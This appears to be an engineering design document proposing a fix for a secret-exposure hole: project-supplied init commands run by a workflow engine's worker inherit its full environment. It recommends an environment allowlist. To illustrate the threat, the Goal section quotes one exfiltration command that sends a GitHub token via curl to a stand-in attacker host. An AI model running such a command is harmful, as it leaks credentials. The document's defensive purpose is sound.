# Design — Task issue-agentic-ops-engine-178

**[bughunt] SpawnCommandRunner executes project-supplied init commands via `shell: true`**

## Goal

`WorkspaceManager.prepare()` runs a project's `initCommands` (from its `agentops.json`)
on the Temporal **activity worker host** via `SpawnCommandRunner.run()`. That runner spawns
each command with `{ shell: true, env: process.env }` (`packages/activities/src/workspace/spawn-command-runner.ts:27`).

`initCommands` are arbitrary, project-supplied shell strings. Because the runner inherits the
worker's **entire** environment, any init command runs with full access to the worker's
secrets — forge/tracker tokens, registry credentials, Temporal connection material, and
anything else the worker process holds in `process.env`. A hostile or accidentally-broken
`agentops.json` (e.g. an init command like `curl https://attacker/ -d "$GITHUB_TOKEN"`, or an
`agentops.json` change riding in on a PR the engine then operates on) exfiltrates those
secrets or tampers with the worker host. This is a real privilege leak: the least-privilege
boundary for untrusted project input is being crossed on the trusted worker.

Note the asymmetry with verify: `fastVerifyCommands`/`fullVerifyCommands` are handed to the
agent and execute inside the sandboxed agent-runner Job (`docs/superpowers/specs/2026-07-07-product-verify-environment-design.md`),
whereas `initCommands` execute directly on the worker with the worker's own environment.

The goal is to close the secret-exposure hole while preserving the legitimate behaviour of
init commands (they are meant to be arbitrary shell — `pnpm install`, `DATABASE_URL=… pnpm migrate`, etc.).

## Approaches considered

### A. Scrub the environment — run project commands with a minimal allowlisted env (recommended)

Keep `shell: true` (init commands are legitimately shell text and rely on it), but stop
passing `env: process.env`. Instead build the child's environment from a small, explicit
**allowlist** of non-secret variables needed to locate and run tooling (`PATH`, `HOME`,
`LANG`/`LC_*`, `TZ`, `TERM`, `SHELL`), and pass only those. Secrets are never in the child's
env because they were never copied in (allowlist, not denylist — a denylist silently leaks
every newly-added secret var).

- **Trade-off:** an init command that today relies on some inherited benign var it did not set
  itself may need to set it inline. In practice init commands already declare their own env
  (mirroring how verify commands do — see the 2026-07-07 verify-environment design), so the
  blast radius is small. Least-privilege by default is the correct posture for untrusted input.
- **Cost/complexity:** low. One file (`spawn-command-runner.ts`) plus tests. No contract,
  workflow, or wiring changes.

### B. Move init-command execution into the sandboxed agent-runner Job

Run `initCommands` where verify runs — inside the project's isolated container/Job — so they
never touch the worker at all, unifying init and verify under one trust boundary.

- **Trade-off:** architecturally cleaner but a large, cross-cutting change. Workspace
  preparation is a Temporal activity that must return a `PreparedWorkspace` ref *before* any
  Job spawns; moving init into the Job reshapes the k8s job runner, the workflow wiring, and
  the timing contract between prepare and verify. High blast radius for a bughunt fix, and it
  changes the SLDS-level lifecycle (AGENTS.md requires that to be deliberate).
- **Cost/complexity:** high. Rejected as out of scope for this issue (recorded as follow-up).

### C. Drop `shell: true` and parse commands into argv (no shell)

Remove shell interpretation so metacharacters can't be interpreted; split the command into
program + args.

- **Trade-off:** breaks legitimate configs — init commands genuinely use shell features
  (inline `VAR=… cmd`, `&&`, pipes), documented and depended upon. Worse, it does **not**
  fix the actual harm: a single argv command (`env`, `curl`, `node -e …`) still exfiltrates
  the inherited secrets. It targets the wrong risk.
- **Cost/complexity:** low effort but negative value. Rejected.

## Chosen approach

**Approach A — environment scrubbing via an allowlist in `SpawnCommandRunner`.**

It removes the real vulnerability (the worker's secrets reaching untrusted, project-supplied
commands) with a localized, low-risk change, and preserves the intended behaviour of init
commands as arbitrary shell. `shell: true` stays because the feature *is* "run this shell
string"; the vulnerability was never shell interpretation itself but the ambient authority
(secrets) handed to it. Approach B is the right long-term home for init execution but is a
lifecycle-level change unfit for a scoped bughunt; Approach C breaks legitimate use while
leaving the secret leak intact. This is one coherent change.

## Assumptions

- **Trust level of `agentops.json` / `initCommands`:** treated as **untrusted** input that
  must not receive the worker's ambient secrets. This is the safe reading of a defence-in-depth
  bughunt even if most configs are benign today; least privilege is the default.
- **Allowlist contents:** `PATH`, `HOME`, `LANG`, `LC_ALL`, `LC_CTYPE`, `TZ`, `TERM`, `SHELL`
  are non-secret and sufficient to locate/run typical tooling (node, pnpm, git, corepack). If
  a project needs an additional benign var, it sets it inline in the command string (the same
  mechanism verify commands already use). No per-project secret allowlist is introduced here —
  default deny; a future feature can add an explicit opt-in surface if a real need appears.
- **Scope boundary — env only, not a timeout:** the pre-existing "init command could hang the
  worker forever" robustness gap (no execution timeout on the spawned child) is real but
  orthogonal to this secret-exposure bug. It is deliberately left out to keep this one coherent
  change, and recorded as a follow-up rather than silently bundled.
- **No new config surface:** the allowlist lives in code as a sensible default (optionally
  overridable via a constructor option for tests), not in `ProjectConfigSchema`. Contracts are
  untouched, so no contract-first work is required.

## Design

**Affected component:** `packages/activities/src/workspace/spawn-command-runner.ts` — the only
consumer of `SpawnCommandRunner` is `WorkspaceManager` for `initCommands`
(`workspace-manager.ts:73,140`); git operations go through `GitCommandRunner`/ports and are
unaffected. Changing the runner therefore only alters how project init commands are spawned.

- Introduce a module-level `INIT_COMMAND_ENV_ALLOWLIST` (the variable names above).
- In `SpawnCommandRunner.run()`, replace `env: process.env` with a freshly-built object
  containing only the allowlisted keys that are actually present in `process.env` (skip
  `undefined` values so the child doesn't get empty overrides). `shell: true` and `cwd` are
  unchanged.
- Optionally accept an `env`/`allowlist` override through `SpawnCommandRunnerOptions` so tests
  can assert the filtering deterministically; production defaults to the allowlist. Keep the
  existing injectable `spawn` seam.

**Data flow (unchanged except env):** workflow → `prepareWorkspace` activity
(`create-activities.ts:378`) → `WorkspaceManager.prepare` → for each init command,
`SpawnCommandRunner.run(command, { cwd })` → child spawned with `shell: true` and the
**scrubbed** env. Exit-code handling, `spawnFailed` semantics, and the `error`/`close`
resolution logic are untouched, so `WorkspaceManager`'s existing error mapping
(`WorkspaceError`, `nonRetryable`) still holds.

**Error handling:** no behavioural change to failure resolution — a command that can't find a
tool because a needed var wasn't inherited still fails as a normal non-zero exit and surfaces
via the existing `init command "…" failed` `WorkspaceError`. That is the intended, visible
signal, not a silent regression.

**Tests** (`packages/activities/src/workspace/spawn-command-runner.test.ts`):
- Assert the spawned options' `env` contains allowlisted keys (e.g. `PATH`) and **excludes** a
  representative secret var seeded into `process.env` for the test (e.g. `GITHUB_TOKEN`).
- Keep the existing assertions that `shell === true` and that `cwd` is forwarded.
- Existing exit-code / `spawnFailed` / hang-prevention tests remain green unchanged.

**Docs:** add a one-line note to `docs/project-config.md`'s `initCommands` description stating
that init commands run with a minimal environment (no inherited engine secrets) and should
declare any vars they need inline — mirroring the verify-command guidance.

**Definition-of-done checks:** `pnpm lint && pnpm typecheck && pnpm test`; e2e is unaffected
(no workflow/policy/backend behaviour change), but will be run since activities are touched.
No new `any`, no contract change, no ports/vendors rule impact.

## Brainstorm Summary
**Approaches considered:** (A) scrub the child environment to a minimal allowlist while keeping `shell: true`; (B) move init-command execution into the sandboxed agent-runner Job; (C) drop `shell: true` and run argv-only.
**Chosen approach:** A — allowlist-scrubbed environment in `SpawnCommandRunner`.
**Why (decisive reasons):** The real defect is ambient authority — untrusted project-supplied init commands inherit the worker's full `process.env` (forge tokens, registry/Temporal secrets), not shell interpretation itself. A localized allowlist in one file removes the secret leak while preserving init commands as legitimate shell. B is a lifecycle-level architectural change too broad for a bughunt; C breaks valid configs and leaves the leak intact.
**Key risks/assumptions:** `initCommands` are treated as untrusted (least-privilege default); commands needing an extra benign var must set it inline. The orthogonal "no execution timeout" robustness gap is deliberately left as a follow-up to keep this one coherent change.
